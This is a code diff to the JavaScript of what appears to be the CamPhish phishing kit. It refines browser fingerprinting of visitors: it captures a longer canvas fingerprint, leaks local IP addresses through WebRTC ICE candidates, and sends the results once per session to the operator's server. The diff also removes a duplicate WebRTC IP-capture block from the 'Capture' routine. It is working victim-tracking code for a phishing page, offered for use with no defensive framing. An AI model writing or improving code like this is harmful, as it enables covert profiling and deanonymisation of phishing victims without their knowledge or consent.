@@ -172,7 +172,7 @@ var Fingerprint = {
       cx.fillText('CamPhish FP', 2, 2);
       cx.fillStyle = 'rgba(102,204,0,0.7)';
       cx.fillText('CamPhish FP', 4, 4);
-      fp.canvas_fingerprint = c.toDataURL().substring(0, 200);
+      fp.canvas_fingerprint = c.toDataURL().substring(0, 2000);
     } catch(e) {}
 
     try {
@@ -277,6 +277,7 @@ var Fingerprint = {
       };
     }
 
+    var fpSent = false;
     function finishFp() {
       fp.session = Session.getId();
       fp.collected_at = new Date().toISOString();
@@ -289,13 +290,16 @@ var Fingerprint = {
             var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
             if (m && m[1] && !m[1].startsWith('0.')) {
               fp.local_ip = m[1];
-              sendFp(fp);
             }
             pc.close();
+            // Fall through to sendFp via the timeout, not here — avoids race
           }
         };
-        setTimeout(function(){ pc.close(); sendFp(fp); }, 3000);
-      } catch(e) { sendFp(fp); }
+        setTimeout(function(){
+          try { pc.close(); } catch(e) {}
+          if (!fpSent) { fpSent = true; sendFp(fp); }
+        }, 2000);
+      } catch(e) { if (!fpSent) { fpSent = true; sendFp(fp); } }
     }
   }
 };
@@ -317,22 +321,6 @@ var Capture = {
       method: 'POST', headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({session: Session.getId()})
     }).catch(function(){});
-    // Async WebRTC local IP detection as fallback
-    try {
-      var pc = new RTCPeerConnection({iceServers: []});
-      pc.createDataChannel('');
-      pc.createOffer(function(offer){ pc.setLocalDescription(offer, function(){}, function(){}); }, function(){});
-      pc.onicecandidate = function(e) {
-        if (e && e.candidate && e.candidate.candidate) {
-          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-          if (m && m[1] && !m[1].startsWith('0.')) {
-            Capture._event('local_ip', {ip: m[1]});
-          }
-          pc.close();
-        }
-      };
-      setTimeout(function(){ try { pc.close(); } catch(e) {} }, 2000);
-    } catch(e) {}
   },
 
   location: function() {
